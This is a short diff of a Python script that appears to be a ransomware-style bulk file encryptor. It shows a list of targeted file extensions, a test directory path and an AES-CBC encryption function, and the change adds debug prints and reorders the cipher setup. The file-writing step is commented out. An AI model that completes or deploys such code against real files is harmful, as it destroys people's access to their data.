@@ -14,12 +14,16 @@ ext = ('.jpg', '.png', '.bmp', '.raw', '.c', '.java', '.class', '.cpp', '.h', '.
 base_path = "/TestFiles/Text/1500KB"
 
 def EncryptFile(fileToEncrypt, key):
-    iv = Random.new().read(16)
-    aes_obj = AES.new(key, AES.MODE_CBC, iv)
-
     file_size = str(os.path.getsize(fileToEncrypt)).zfill(16)
     dir_path, file_name = os.path.split(fileToEncrypt)
     
+    print(file_size)
+    print(dir_path)
+    print(file_name)
+    
+    iv = Random.new().read(16)
+    aes_obj = AES.new(key, AES.MODE_CBC, iv)
+
     # with open(fileToEncrypt, 'rb') as infile:
     #     with open(os.path.join(dir_path, encrypted_symbol + file_name), 'wb') as outfile:
     #         outfile.write(file_size.encode('utf-8'))
